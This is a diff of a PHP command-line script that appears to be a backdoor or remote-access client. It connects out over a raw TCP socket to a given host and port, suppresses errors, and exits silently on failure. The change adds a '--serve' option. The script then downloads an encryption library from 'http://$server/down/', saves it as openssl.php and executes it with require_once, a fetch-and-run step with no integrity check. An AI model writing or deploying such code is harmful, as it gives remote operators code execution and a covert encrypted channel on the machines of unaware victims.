@@ -4,18 +4,24 @@
 	ob_implicit_flush(1);
 	define("BUFFER_LEN", 4096);
 
-	$opts = getopt("h:p:", ["host:", "port:"]);
-	$opensslpath = './Openssl_EncryptDecrypt.php';
+	$opts = getopt("h:p:s:", ["host:", "port:", "serve:"]);
 
-	(count($opts) === 2) || die();
+	(count($opts) === 3) || die();
 	$addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
+	$server = array_key_exists("serve", $opts) ? trim($opts['serve']) : trim($opts['s']);
+
+	$newpath = './openssl.php';
+	if(file_exists($newpath) === false){
+		$opensslpath = "http://$server/down/Openssl_EncryptDecrypt.php";
+		copy($opensslpath, $newpath);
+	}
 
 	($socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) || die();
 	($result = @socket_connect($socket, $addr, $port)) || die();
 
-	if(file_exists($opensslpath)){
-		require_once $opensslpath;
+	if(file_exists($newpath)){
+		require_once $newpath;
 		$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
 	} else { die(); }
 
